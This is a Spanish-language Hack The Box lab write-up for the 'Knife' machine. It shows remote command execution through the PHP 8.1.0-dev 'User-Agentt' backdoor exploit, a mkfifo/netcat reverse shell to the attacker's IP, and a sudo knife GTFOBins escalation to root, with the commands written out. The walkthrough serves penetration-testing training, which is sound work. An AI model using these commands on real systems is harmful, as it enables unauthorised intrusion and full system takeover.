# Knife — Hack The Box

**Máquina:** Knife · **SO:** Linux · **Dificultad:** Easy · **Lista:** TJ Null (OSCP)

| Campo | Detalle |
|---|---|
| Objetivo | `10.129.77.204` (knife) |
| Sistema | Linux — Ubuntu (Apache 2.4.41, PHP 8.1.0-dev) |
| Vector de entrada | Backdoor de PHP 8.1.0-dev (cabecera `User-Agentt`) |
| Escalada | sudo knife (GTFOBins) → root |
| Herramientas | nmap, curl, searchsploit, netcat |

---

## 1. Resumen

Knife expone un servidor web con **PHP 8.1.0-dev**, una versión que fue distribuida con un **backdoor** en su código fuente. Enviando una cabecera HTTP especial (`User-Agentt`) se consigue ejecución remota de comandos como el usuario **james**. La escalada a **root** se logra abusando de un permiso sudo sobre el binario `knife`, que puede ejecutar código Ruby arbitrario.

---

## 2. Enumeración

```console
$ nmap -p- --min-rate=1000 -T4 10.129.77.204
22/tcp open  ssh
80/tcp open  http

$ nmap -sC -sV -p 22,80 10.129.77.204
22/tcp open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Emergent Medical Idea
```

El nmap no da mucho de la web. La clave aparece al inspeccionar las **cabeceras HTTP**:

```console
$ curl -I http://10.129.77.204
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
```

`PHP/8.1.0-dev` es una versión concreta → se busca exploit conocido:

```console
$ searchsploit php backdoor
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
```

---

## 3. Explotación — backdoor de PHP 8.1.0-dev

PHP 8.1.0-dev se publicó (marzo 2021) con un backdoor introducido al comprometer su repositorio. Se activa enviando la cabecera `User-Agentt` (con doble T) con el formato `zerodiumsystem('comando')`.

Se copia y revisa el exploit antes de ejecutarlo:
```console
$ searchsploit -m php/webapps/49933.py
$ cat 49933.py    # revisión: usa la cabecera User-Agentt, abre una pseudo-shell
$ python3 49933.py
Enter the full host url:
http://10.129.77.204

Interactive shell is opened
$ whoami
james
```

La pseudo-shell del exploit no maneja comillas (rompe las reverse shell de bash/python). Se usa una reverse shell con **mkfifo** (sin comillas):
```console
# En Kali:  nc -lvnp 4444
# En la pseudo-shell:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.195 4444 >/tmp/f
```
```console
james@knife:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
james@knife:/$ whoami
james
```

---

## 4. Escalada: james → root (sudo knife)

```console
sudo -l
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

james puede ejecutar `knife` como root sin contraseña. `knife` (herramienta de Chef) puede ejecutar código Ruby arbitrario. Según **GTFOBins** (gtfobins.github.io):

```console
sudo knife exec -E 'exec "/bin/bash"'
whoami
root
```

> **La técnica (binario sudo + GTFOBins):** `knife` ejecuta Ruby con `exec -E`. Como corre como root por la regla sudo, `exec "/bin/bash"` abre una shell que hereda root. Mismo patrón que Shocker (perl), distinto binario.

---

## 5. Resumen de la cadena

| Fase | Acción | Resultado |
|---|---|---|
| Enumeración | nmap + curl -I | PHP 8.1.0-dev detectado en cabeceras |
| Explotación | Backdoor User-Agentt (exploit 49933) | Shell como james |
| Estabilización | reverse shell mkfifo (sin comillas) | Shell interactiva |
| Escalada | sudo knife (GTFOBins) | Shell como root |
| Flags | root.txt + user.txt | Máquina completada |

---

## Lecciones

- **`curl -I`** (cabeceras HTTP) reveló la versión de PHP que el nmap no mostraba → siempre inspeccionar cabeceras.
- **Leer el exploit antes de ejecutarlo** (`cat`) — regla de oro.
- Cuando la shell rompe las comillas (pseudo-shells de exploits), usar la **reverse shell de mkfifo**, que no las lleva.
